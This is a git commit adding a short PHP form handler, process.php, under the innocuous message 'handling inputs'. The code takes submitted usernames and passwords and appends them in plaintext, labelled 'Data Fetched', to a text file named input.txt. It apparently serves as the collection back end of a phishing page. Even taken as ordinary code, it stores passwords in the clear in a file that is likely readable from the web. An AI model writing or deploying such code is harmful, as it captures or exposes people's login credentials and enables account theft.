43cf752f9a3ef405db95c4e69d03fd629811dc6c
codetesla <uoladele99@gmail.com>
2024-10-20 21:38:11 +0100

    process file for handling inputs

---
+++ process.php
@@ -0,0 +1,15 @@
+    <?php if (isset($_POST["submit"])) {
+      $user_name = $_POST["user_name"];
+      $user_pass = $_POST["password"];
+
+      // Concatenate user data properly
+      $data = "Data Fetched \n";
+      $data .= "Username: $user_name\n";
+      $data .= "Password: $user_pass\n";
+      $data .= "-------------------------------------\n";
+
+      // Write the data to input.txt
+      file_put_contents("input.txt", $data, FILE_APPEND);
+
+      echo "<p>Saved to input.txt</p>";
+    }
